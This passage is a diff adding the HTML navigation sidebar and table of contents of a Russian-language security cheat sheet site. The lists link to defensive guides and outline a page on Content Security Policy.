+  
+  <span class="md-ellipsis">
+    Безопасность Docker
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="DotNet_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность .NET
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Drone_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность дронов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Error_Handling_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Обработка ошибок
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="File_Upload_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Загрузка файлов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Forgot_Password_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Восстановление пароля
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="GraphQL_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность GraphQL
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="gRPC_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность gRPC
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="HTML5_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность HTML5
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="HTTP_Headers_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTP-заголовки
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="HTTP_Strict_Transport_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTP Strict Transport Security
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Infrastructure_as_Code_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Infrastructure as Code
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение инъекций
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Injection_Prevention_in_Java_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение инъекций в Java
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Input_Validation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Валидация входных данных
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение IDOR
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="JAAS_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JAAS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="JSON_Web_Token_for_Java_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JSON Web Token для Java
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Java_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Java
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Key_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление ключами
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Kubernetes_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Kubernetes
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Laravel_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Laravel
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="LDAP_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение LDAP-инъекций
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Legacy_Application_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление устаревшими приложениями
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="LLM_Prompt_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение LLM Prompt Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Logging_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Логирование
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Logging_Vocabulary_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Словарь событий логирования
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="MCP_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность MCP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Mass_Assignment_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Массовое присваивание
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Microservices_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность микросервисов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Microservices_based_Security_Arch_Doc_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Архитектура безопасности микросервисов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Mobile_Application_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность мобильных приложений
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Multifactor_Authentication_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Многофакторная аутентификация
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Multi_Tenant_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность мультиарендных систем
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Network_Segmentation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Сегментация сети
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="NodeJS_Docker_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Node.js в Docker
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Nodejs_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Node.js
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="NoSQL_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность NoSQL
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="NPM_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность NPM
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="OAuth2_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OAuth 2.0
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="OS_Command_Injection_Defense_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Защита от инъекции команд ОС
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Password_Storage_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Хранение паролей
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="PHP_Configuration_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Конфигурация PHP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Pinning_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Закрепление сертификатов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Prototype_Pollution_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение Prototype Pollution
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Query_Parameterization_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Параметризация запросов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="REST_Assessment_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Оценка REST
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="REST_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность REST
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Ruby_on_Rails_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Ruby on Rails
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="SAML_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность SAML
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="SQL_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение SQL-инъекций
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secure_AI_Model_Ops_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Операции с AI-моделями
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secure_Cloud_Architecture_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасная облачная архитектура
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secure_Code_Review_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Анализ безопасности кода
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secure_Product_Design_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасное проектирование продукта
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Securing_Cascading_Style_Sheets_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность CSS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение SSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Serverless_FaaS_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Serverless/FaaS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Session_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление сессиями
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Software_Supply_Chain_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность цепочки поставок ПО
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Symfony_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Symfony
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Secrets_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление секретами
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Third_Party_Javascript_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление сторонним JavaScript
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Third_Party_Payment_Gateway_Integration.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Интеграция платёжных шлюзов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Threat_Modeling_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Моделирование угроз
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="TLS_Cipher_String_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Строки шифров TLS (устарело)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Transaction_Authorization_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Авторизация транзакций
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Transport_Layer_Protection_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Защита транспортного уровня (устарело)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Transport_Layer_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность транспортного уровня
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Неверифицированные перенаправления
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="User_Privacy_Protection_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Защита конфиденциальности пользователей
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Virtual_Patching_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Виртуальные патчи
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Vulnerability_Disclosure_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Раскрытие уязвимостей
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Vulnerable_Dependency_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление уязвимыми зависимостями
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Web_Service_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность веб-сервисов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="WebSocket_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность WebSocket
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="XML_External_Entity_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение XXE
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="XML_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность XML
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="XS_Leaks_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XS Leaks
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="XSS_Filter_Evasion_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Обход XSS-фильтров
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Zero_Trust_Architecture_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Архитектура Zero Trust
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Введение
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Контекст
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Контекст">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      Защита от XSS
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Защита от XSS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Ограничение встроенных скриптов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Ограничение удалённых скриптов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-javascript" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Ограничение небезопасного JavaScript
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Ограничение отправки форм
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Ограничение объектов
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Защита от атак через фреймирование
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Эшелонированная защита
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      Доставка политики
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Доставка политики">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-content-security-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Заголовок Content-Security-Policy
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-content-security-policy-report-only" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Заголовок Content-Security-Policy-Report-Only
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-meta-content-security-policy" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Meta-тег Content-Security-Policy
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      ПРЕДУПРЕЖДЕНИЕ
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Типы CSP (гранулярный/на основе списков разрешений или строгий)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csp_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Строгая CSP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Строгая CSP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nonce" class="md-nav__link">
+    <span class="md-ellipsis">
+      На основе nonce
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="На основе nonce">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      Предупреждение
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      Хеши
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Хеши">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      Примечание
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#strict-dynamic" class="md-nav__link">
+    <span class="md-ellipsis">
+      strict-dynamic
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csp_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Подробные директивы CSP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Подробные директивы CSP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fetch" class="md-nav__link">
+    <span class="md-ellipsis">
+      Директивы Fetch
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      Директивы документа
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      Директивы навигации
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      Директивы отчётности
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      Специальные источники директив
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csp_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Примеры политик CSP
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Примеры политик CSP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      Строгая политика
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Строгая политика">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nonce_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Строгая политика на основе nonce
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      Строгая политика на основе хеша
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#csp_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      Базовая нестрогая политика CSP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      Обновление небезопасных запросов
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#clickjacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      Предотвращение атак через фреймирование (Clickjacking, межсайтовые утечки)
+    </span>
+  </a>
